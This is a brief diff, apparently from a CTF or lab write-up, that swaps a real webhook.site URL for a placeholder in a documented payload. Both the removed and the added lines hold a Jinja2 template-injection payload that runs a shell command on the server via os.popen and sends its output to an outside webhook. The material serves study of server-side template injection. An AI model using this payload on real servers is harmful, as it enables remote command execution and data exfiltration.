@@ -69,7 +69,7 @@ Payload: <br>
 <a>
 ```
 {
-  "template": "{{ url_for.__globals__['__builtins__']['__import__']('urllib2').urlopen('https://webhook.site/0139531b-9559-42d0-a71a-b43e039822c2/?flag=' + url_for.__globals__['os'].popen('ls').read()) }}"
+  "template": "{{ url_for.__globals__['__builtins__']['__import__']('urllib2').urlopen('<Link_Webhook>/?flag=' + url_for.__globals__['os'].popen('ls').read()) }}"
 }
 ```
 </a> 
